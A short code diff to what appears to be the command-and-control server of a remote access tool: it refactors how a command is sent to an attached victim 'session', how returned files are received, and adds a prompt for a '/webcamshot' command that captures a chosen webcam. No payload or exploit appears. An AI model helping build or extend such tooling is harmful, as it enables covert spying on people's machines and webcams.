@@ -166,15 +166,23 @@ class Server(object):
         self.checkFolders()
 
         if self.userAttached:
-            connection = self.getCurrentUser()['conn']
-            connection.send(self.lastCommand.encode())
             try:
+                connection = self.getCurrentUser()['conn']
+                connection.send(self.lastCommand.encode())
+                
                 header = loads(connection.recv(512))
-                if header['sucess']:
-                    self.receiveFile(connection, header)
+                if args:
+                    if header['sucess']:
+                        self.receiveFile(connection, header)
+                    else:
+                        printr(header["content"])
                 else:
-                    printr(f'[red]{header["content"]}')
-                    
+                    if header['sucess']:
+                        printr(header['content'])
+                        printr(f'[green]Pass any webcam [yellow]Id[green] to take a webcamshot | Ex: [yellow]/webcamshot 2')
+                    else:
+                        printr(header["content"])
+
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
